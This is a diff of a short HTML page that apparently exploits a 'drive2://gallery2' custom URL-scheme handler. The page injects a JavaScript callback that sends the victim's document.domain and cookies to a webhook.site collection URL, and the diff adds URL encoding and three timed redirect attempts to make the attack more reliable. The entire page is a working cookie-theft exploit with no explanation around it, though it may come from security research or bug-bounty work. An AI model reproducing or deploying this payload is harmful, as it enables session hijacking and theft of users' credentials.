@@ -1,7 +1,27 @@
 <html>
+<head><meta charset="utf-8"></head>
 <body>
+<p>Loading...</p>
 <script>
-window.location="drive2://gallery2?callback=new Image().src='https://webhook.site/906ac80b-4d33-470e-8bad-ae4efeb4291e?d='+document.domain+'%26c='+document.cookie";
+var webhook = "https://webhook.site/906ac80b-4d33-470e-8bad-ae4efeb4291e";
+
+var js = "new Image().src='" + webhook + "?d='+encodeURIComponent(document.domain)+'&c='+encodeURIComponent(document.cookie)";
+
+var url = "drive2://gallery2?callback=" + encodeURIComponent(js);
+
+setTimeout(function() {
+  window.location.href = url;
+}, 300);
+
+setTimeout(function() {
+  var a = document.createElement("a");
+  a.href = url;
+  a.click();
+}, 600);
+
+setTimeout(function() {
+  try { window.location.replace(url); } catch(e) {}
+}, 900);
 </script>
 </body>
 </html>
